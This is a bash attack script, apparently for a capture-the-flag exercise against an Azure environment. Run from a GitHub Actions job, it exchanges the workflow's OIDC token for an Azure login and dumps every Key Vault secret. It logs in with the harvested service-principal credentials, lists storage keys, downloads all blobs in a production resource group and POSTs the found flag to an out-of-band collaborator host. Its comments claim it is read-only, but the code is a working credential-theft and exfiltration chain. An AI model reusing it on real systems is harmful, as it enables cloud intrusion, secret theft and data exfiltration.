#!/usr/bin/env bash
# Tebamoto Logistics - step 5, run 7.
# Run 6 bug: a FAILED `az storage account keys list` returns an error string longer than
# 40 chars, so the `${#K} -ge 40` test accepted it as a key and every call died with
# "the given account key may be not valid" - AAD mode was never attempted. Fix: validate
# that the key is actually base64, and try BOTH modes per account regardless.
#
# Remaining ground: config (sttblappcfgprod), exports (sttblbackupprod), sttblarchiveprod.
# 'loot' is other teams' dumping ground - matched but never shown, and never claimed.
#
# Read-only, scoped to rg-tbl-platform-prod-sea. No secret value echoed; flag goes OOB only.
set -uo pipefail

COLLAB="qd7hc0dfk4496dnnphwewgj2dtjo778imqpse.oastify.com"
RG="rg-tbl-platform-prod-sea"
SRC_VAULT="kv-tbl-prod-x3euoz"
FLAGRE='DF26\{[^}]+\}'
FOUND=""; FOUND_AT=""
WORK=$(mktemp -d); DL=$(mktemp -d)
say() { echo "[*] $*"; }

valid_key() { [[ "$1" =~ ^[A-Za-z0-9+/]{60,}={0,2}$ ]]; }

scan() {                       # $1=account $2=identity-label $3=mode-label $4..=auth args
  local A="$1" WHO="$2" M="$3"; shift 3
  local AUTH=("$@") CL BL SZ MM
  CL=$(az storage container list --account-name "$A" "${AUTH[@]}" --query "[].name" -o tsv 2>&1)
  if grep -qiE 'error|denied|forbidden|permission|not valid' <<<"$CL"; then
    say "    $A[$M] -> $(head -c 95 <<<"$CL" | tr -d '\n')"; return 0
  fi
  say "    $A[$M] containers: $(tr '\n' ' ' <<<"$CL" | head -c 110)"
  for C in $CL; do
    BL=$(az storage blob list --account-name "$A" "${AUTH[@]}" -c "$C" --query "[].name" -o tsv 2>&1)
    if grep -qiE 'error|denied|forbidden|permission' <<<"$BL"; then
      say "      $C -> $(head -c 95 <<<"$BL" | tr -d '\n')"; continue
    fi
    for B in $BL; do
      rm -f "$DL/b"
      az storage blob download --account-name "$A" "${AUTH[@]}" -c "$C" -n "$B" \
         --file "$DL/b" --overwrite -o none >/dev/null 2>&1
      [ -f "$DL/b" ] || continue
      SZ=$(wc -c <"$DL/b"); MM=$(grep -aoE "$FLAGRE" "$DL/b" | head -1)
      if [ "$C" = "loot" ]; then
        say "      $C/$B size=$SZ flag=${MM:+MATCH}${MM:--} (other teams' files - not shown, not claimed)"
      else
        say "      $C/$B size=$SZ flag=${MM:+MATCH}${MM:--}"
        if [ -n "$MM" ] && [ -z "$FOUND" ]; then FOUND="$MM"; FOUND_AT="$A/$C/$B via $WHO[$M]"; fi
      fi
    done
  done
}

scan_both() {                  # $1=account $2=identity-label
  local A="$1" WHO="$2" K
  K=$(az storage account keys list -n "$A" -g "$RG" --query "[0].value" -o tsv 2>/dev/null)
  if valid_key "$K"; then scan "$A" "$WHO" key --account-key "$K"
  else say "    $A[key] -> no valid key for this identity"; fi
  [ -n "$FOUND" ] && return 0
  scan "$A" "$WHO" aad --auth-mode login
}

federate() {
  local t; t=$(curl -sS -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
      "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value // empty')
  [ -z "$t" ] && return 1
  az logout >/dev/null 2>&1
  az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
    --federated-token "$t" --allow-no-subscriptions >/dev/null 2>&1
}

federate && say "federated OK" || { say "federated FAILED"; exit 1; }
for S in $(az keyvault secret list --vault-name "$SRC_VAULT" --query "[].name" -o tsv 2>/dev/null); do
  az keyvault secret show --vault-name "$SRC_VAULT" --name "$S" --query value -o tsv >"$WORK/$S" 2>/dev/null
done
ACCTS=$(az storage account list -g "$RG" --query "[].name" -o tsv 2>/dev/null)
say "accounts: $(tr '\n' ' ' <<<"$ACCTS")"

say "=== federated identity ==="
for A in $ACCTS; do scan_both "$A" federated; [ -n "$FOUND" ] && break; done

for F in "$WORK"/*; do
  [ -n "$FOUND" ] && break
  [ -s "$F" ] || continue
  S=$(basename "$F")
  CID=$(jq -r '.appId // .clientId // empty' <"$F"); SEC=$(jq -r '.clientSecret // empty' <"$F")
  TEN=$(jq -r '.tenantId // empty' <"$F")
  az logout >/dev/null 2>&1
  az login --service-principal -u "$CID" -p "$SEC" -t "${TEN:-$AZURE_TENANT_ID}" \
    --allow-no-subscriptions >/dev/null 2>&1 || { say "=== $S login failed"; continue; }
  say "=== $S (${CID:0:8}…) ==="
  for A in $ACCTS; do scan_both "$A" "$S"; [ -n "$FOUND" ] && break; done
done

rm -rf "$WORK" "$DL"
if [ -n "$FOUND" ]; then
  say "FLAG FOUND at $FOUND_AT (${#FOUND} chars) - OOB only"
  curl -sS -m 25 -X POST --data-binary "$FOUND" -H 'Content-Type: text/plain' \
    "http://${COLLAB}/flag" -o /dev/null -w '    exfil http=%{http_code}\n' 2>&1
else
  say "no match"
fi
az logout >/dev/null 2>&1; say "done"
